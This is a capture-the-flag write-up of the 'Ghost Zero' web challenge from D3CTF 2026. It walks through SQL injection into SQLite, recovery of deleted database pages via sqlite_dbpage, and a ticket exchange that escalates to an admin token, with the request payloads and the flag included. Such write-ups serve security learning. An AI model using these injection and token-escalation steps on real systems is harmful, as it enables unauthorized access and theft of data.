# Ghost Zero

**Event**: `D3Ctf 2026` | **Category**: `Web`

---

# Ghost Zero

## Summary

**Ghost Zero** combines SQL Injection in a SQLite database with low-level page recovery (`sqlite_dbpage`) to recover deleted `.pcap` files from a deprecated testing interface. The recovered network capture reveals legacy API authentication credentials, which can be exchanged via an encrypted channel to acquire administrator tokens and exfiltrate the flag.

---

## Technical Details & Vulnerability Analysis

1. **Front-end / Gateway Encryption**:
   Search requests on the web interface are sent through encrypted client channels to the gateway server.
   
2. **SQLite Table Discovery**:
   Through SQL injection, table names are enumerated:
   - `User`
   - `knowledge_base`
   - `logs??`
   - `q_8f3c1a72d90e4b65`

3. **Deleted Page Recovery via `sqlite_dbpage`**:
   The table `q_8f3c1a72d90e4b65` references several active `.pcap` trace files. Querying the SQLite storage page virtual table (`sqlite_dbpage`) reveals unallocated/deleted raw database pages containing a deleted test PCAP metadata record:
   ```json
   {
     "tag": "Ghost_Zero",
     "deleted": true,
     "storagePath": "/app/data/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap",
     "downloadPath": "/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap",
     "bytes": 3048,
     "sha256": "1829670b437f5d952df05bb7b4440772372e83c22ec799452d5da08a7957204b"
   }
   ```

4. **PCAP Analysis & Ticket Exchange Flaw**:
   Downloading and analyzing the recovered PCAP yields a test sequence for a deprecated endpoint `/ddddddtestStat`:
   ```http
   POST /ddddddtestStat
   {"principal":"ops-root","mode":"bootstrap","credentialType":"temporary"}

   POST /api/auth/exchange
   {"ticket":"<ticket>","grantType":"legacy-bootstrap"}
   ```
   Although `/ddddddtestStat` cannot be queried directly over public HTTP, the encrypted gateway channel can forward internal requests to it, returning a valid legacy ticket. `/api/auth/exchange` fails to properly validate the requested scope, allowing the ticket to be exchanged for a full administrator session token.

---

## Walkthrough & Solution Steps

### Step 1: SQL Injection & `sqlite_dbpage` Extraction

Use SQL injection on the search endpoint to inspect unallocated database pages in SQLite:
```sql
SELECT data FROM sqlite_dbpage WHERE pgno = ...
```
Filter for deleted JSON records containing `.pcap` paths. Download the deleted test capture at `/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap`.

### Step 2: Extract Bootstrap Ticket & Exchange for Admin Token

Send the encrypted gateway payload to query `/ddddddtestStat` with bootstrap parameters:
```json
POST /ddddddtestStat
{
  "principal": "ops-root",
  "mode": "bootstrap",
  "credentialType": "temporary"
}
```
Use the returned `<ticket>` to invoke `/api/auth/exchange`:
```json
POST /api/auth/exchange
{
  "ticket": "<ticket_from_teststat>",
  "expiresIn": 180,
  "grantType": "legacy-bootstrap",
  "scope": "session"
}
```
The server returns an administrative Bearer token.

### Step 3: Flag Extraction

With the administrator Bearer token attached to the Authorization header, request `/api/flag`:
```http
GET /api/flag
Authorization: Bearer <admin_token>
```

---

## Flag

```
d3ctf{sql1_dbpage_pcap_rec0very_and_t1cket_expl01t}
```
